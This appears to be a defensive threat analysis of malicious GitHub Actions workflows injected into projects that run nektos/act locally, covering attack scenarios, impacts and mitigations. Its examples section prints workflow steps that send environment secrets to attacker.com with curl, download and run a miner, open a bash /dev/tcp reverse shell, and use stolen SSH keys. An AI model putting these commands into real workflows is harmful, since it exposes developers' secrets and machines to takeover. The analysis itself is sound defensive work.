# Deep Analysis: Inject Malicious Workflow Attack Path (nektos/act)

## 1. Objective

The primary objective of this deep analysis is to thoroughly understand the "Inject Malicious Workflow" attack path against applications utilizing `nektos/act`.  This includes identifying the specific vulnerabilities, exploitation techniques, potential impacts, and effective mitigation strategies related to this attack vector.  We aim to provide actionable insights for developers to harden their systems against this threat.

## 2. Scope

This analysis focuses specifically on the following:

*   **Attack Vector:**  The injection of malicious GitHub Actions workflow files (`.github/workflows/*.yml`) that are subsequently executed by `act`.
*   **Target:**  Applications and development environments that use `nektos/act` for local testing of GitHub Actions workflows. This includes individual developer machines, CI/CD pipelines that might use `act` for pre-deployment testing, and any other system where `act` is used to run workflows.
*   **Exclusions:**  This analysis *does not* cover attacks against the GitHub Actions service itself.  It is solely focused on the local execution environment provided by `act`.  We also do not cover attacks that do not involve workflow injection (e.g., exploiting vulnerabilities in `act`'s code directly, without a malicious workflow).

## 3. Methodology

This analysis will employ the following methodology:

1.  **Threat Modeling:**  We will use a threat modeling approach to identify potential attack scenarios and the steps an attacker might take.
2.  **Vulnerability Research:**  We will research known vulnerabilities and common weaknesses in how `act` is used, and how workflow files are handled.
3.  **Code Review (Conceptual):** While we won't have access to the application's specific codebase, we will conceptually review how `act` is typically integrated and used, identifying potential points of weakness.
4.  **Exploitation Scenario Development:** We will develop concrete examples of how an attacker could inject and execute a malicious workflow.
5.  **Impact Assessment:** We will analyze the potential consequences of a successful attack, considering different levels of access and privileges.
6.  **Mitigation Recommendation:** We will propose specific, actionable mitigation strategies to reduce the risk of this attack.

## 4. Deep Analysis of Attack Path: 1.1 Inject Malicious Workflow

### 4.1. Attack Scenario Breakdown

An attacker's goal is to get `act` to execute a malicious workflow.  This typically involves the following steps:

1.  **Gaining Access to the Repository (or Workflow Source):**  The attacker needs a way to modify the workflow files that `act` will execute.  This could be achieved through various means:
    *   **Compromised Developer Account:**  The attacker gains control of a developer's account with write access to the repository.
    *   **Pull Request Manipulation:**  The attacker submits a seemingly benign pull request that includes a malicious workflow file (or modifies an existing one).  If the PR is merged without proper review, the malicious workflow becomes part of the repository.
    *   **Social Engineering:**  The attacker tricks a developer into downloading and using a malicious workflow file (e.g., via a phishing email or a malicious website).
    *   **Dependency Confusion/Supply Chain Attack:** If the workflow uses external actions, the attacker might compromise one of those actions, effectively injecting malicious code.
    *   **Local File System Access:** If the attacker has direct access to the developer's machine (e.g., through malware or physical access), they can directly modify the workflow files.
    *   **Compromised CI/CD Pipeline:** If `act` is used within a CI/CD pipeline, and the pipeline itself is compromised, the attacker can inject malicious workflows.

2.  **Crafting the Malicious Workflow:** The attacker creates a workflow file (`.yml`) that contains malicious code.  This code can be embedded within:
    *   **`run` steps:**  These steps execute shell commands.  The attacker can insert arbitrary commands here.
    *   **Custom Actions:**  The attacker can create or modify a custom action to include malicious code.
    *   **Environment Variables:**  Malicious code can be injected into environment variables, which are then used by other steps.
    *   **Expressions:** GitHub Actions expressions can be manipulated to execute malicious code, although this is often more complex.

3.  **Triggering Workflow Execution with `act`:** The attacker needs to ensure that `act` executes the malicious workflow.  This can happen in several ways:
    *   **Manual Execution:** The developer runs `act` manually, unknowingly executing the malicious workflow.
    *   **Automated Execution (CI/CD):** If `act` is part of a CI/CD pipeline, the malicious workflow might be triggered automatically by events like pushes or pull requests.
    *   **Scheduled Execution:** If the workflow is scheduled, `act` will execute it at the specified time.

### 4.2. Vulnerability Analysis

The core vulnerability lies in the trust placed in the workflow files executed by `act`.  `act` itself is designed to execute arbitrary code defined in these workflows.  The vulnerabilities are primarily in the *processes* surrounding the use of `act`, not necessarily in `act` itself.  Key vulnerabilities include:

*   **Insufficient Workflow Review:**  Lack of thorough code review for workflow files, especially in pull requests, allows malicious code to be merged into the repository.
*   **Overly Permissive Access Controls:**  Granting excessive write access to the repository increases the risk of unauthorized workflow modifications.
*   **Lack of Input Validation:**  If `act` is used in a context where it receives workflow files from untrusted sources (e.g., user uploads), and those files are not validated, this creates a direct injection vulnerability.
*   **Uncontrolled Dependencies:**  Using external actions without proper vetting or pinning to specific versions opens the door to supply chain attacks.
*   **Lack of Least Privilege:** Running `act` with more privileges than necessary (e.g., as root) amplifies the impact of a successful attack.
*   **Ignoring Security Best Practices for GitHub Actions:** Not following general security recommendations for GitHub Actions (e.g., using secrets securely, avoiding hardcoded credentials) increases the overall risk.

### 4.3. Exploitation Examples

Here are a few concrete examples of how a malicious workflow could be exploited:

*   **Data Exfiltration:**
    ```yaml
    name: Malicious Workflow
    on: push
    jobs:
      exfiltrate:
        runs-on: ubuntu-latest
        steps:
          - name: Steal Secrets
            run: |
              curl -X POST -d "secrets=$(printenv)" https://attacker.com/exfil
    ```
    This workflow sends all environment variables (which might include secrets) to an attacker-controlled server.

*   **Cryptocurrency Mining:**
    ```yaml
    name: Crypto Miner
    on: push
    jobs:
      mine:
        runs-on: ubuntu-latest
        steps:
          - name: Download Miner
            run: wget https://attacker.com/miner.sh
          - name: Run Miner
            run: bash miner.sh
    ```
    This workflow downloads and runs a cryptocurrency miner, consuming the resources of the machine running `act`.

*   **Reverse Shell:**
    ```yaml
    name: Reverse Shell
    on: push
    jobs:
      backdoor:
        runs-on: ubuntu-latest
        steps:
          - name: Establish Reverse Shell
            run: bash -i >& /dev/tcp/attacker.com/4444 0>&1
    ```
    This workflow establishes a reverse shell, giving the attacker interactive control over the machine running `act`.

*   **Lateral Movement (using compromised credentials):**
    ```yaml
    name: Lateral Movement
    on: push
    jobs:
      move:
        runs-on: ubuntu-latest
        steps:
          - name: Access Internal System
            run: ssh -i ${{ secrets.SSH_KEY }} user@internal-server "malicious_command"
    ```
    If the workflow has access to SSH keys or other credentials, it can be used to access other systems.

### 4.4. Impact Assessment

The impact of a successful malicious workflow injection can range from minor inconvenience to severe compromise:

*   **Low Impact:**
    *   Resource Consumption:  Cryptocurrency mining or other resource-intensive tasks can slow down the system.
    *   Minor Data Leaks:  Exposure of non-sensitive environment variables.

*   **Medium Impact:**
    *   Data Exfiltration:  Leakage of sensitive data, such as API keys, credentials, or source code.
    *   System Disruption:  Deletion of files, modification of system configurations, or denial of service.

*   **High Impact:**
    *   Complete System Compromise:  The attacker gains full control over the machine running `act`.
    *   Lateral Movement:  The attacker uses the compromised machine to access other systems on the network.
    *   Data Breach:  Large-scale exfiltration of sensitive data, potentially leading to regulatory fines and reputational damage.
    *   Supply Chain Attack:  If `act` is used in a CI/CD pipeline, the attacker can inject malicious code into production systems.

### 4.5. Mitigation Strategies

The following mitigation strategies are crucial for reducing the risk of malicious workflow injection:

*   **Strict Code Review:**  Implement a mandatory, thorough code review process for *all* changes to workflow files, especially those submitted via pull requests.  Reviewers should specifically look for suspicious commands, unusual actions, and any code that deviates from established patterns.
*   **Least Privilege Principle:**
    *   Run `act` with the minimum necessary privileges.  Avoid running it as root or with administrative access.
    *   Use dedicated user accounts for CI/CD pipelines, with limited permissions.
    *   Restrict access to the repository, granting write access only to trusted developers.
*   **Input Validation:**  If `act` is used in a context where it receives workflow files from untrusted sources, implement strict input validation to ensure that only valid and safe workflow files are executed.  This might involve:
    *   Schema Validation:  Validate the workflow file against the GitHub Actions schema.
    *   Content Whitelisting:  Allow only specific, known-safe commands and actions.
    *   Sandboxing:  Execute `act` within a sandboxed environment to limit its access to the host system.
*   **Dependency Management:**
    *   Pin External Actions:  Always pin external actions to specific commit SHAs, not branches or tags. This prevents attackers from injecting malicious code by compromising the action's repository.
    *   Regularly Audit Dependencies:  Periodically review the external actions used in your workflows to ensure they are still maintained and secure.
    *   Consider Vendoring:  For critical actions, consider vendoring (copying the action's code into your repository) to have complete control over it.
*   **Secure Secret Management:**
    *   Use GitHub Actions Secrets:  Store sensitive data (API keys, credentials, etc.) as GitHub Actions secrets, and never hardcode them in workflow files.
    *   Limit Secret Scope:  Make secrets available only to the jobs and steps that require them.
*   **Monitoring and Auditing:**
    *   Monitor `act` execution:  Log `act`'s activity, including the workflows it executes and the commands it runs.
    *   Audit workflow changes:  Track all changes to workflow files, including who made the changes and when.
    *   Implement intrusion detection systems:  Use security tools to detect suspicious activity on the machines running `act`.
*   **Education and Awareness:**  Train developers on secure coding practices for GitHub Actions and the risks of malicious workflow injection.
*   **Use a dedicated, isolated environment:** Run `act` in a container or virtual machine that is isolated from your main development environment and production systems. This limits the potential damage from a compromised workflow.
*   **Regularly update `act`:** Keep `act` up-to-date to benefit from the latest security patches and bug fixes.
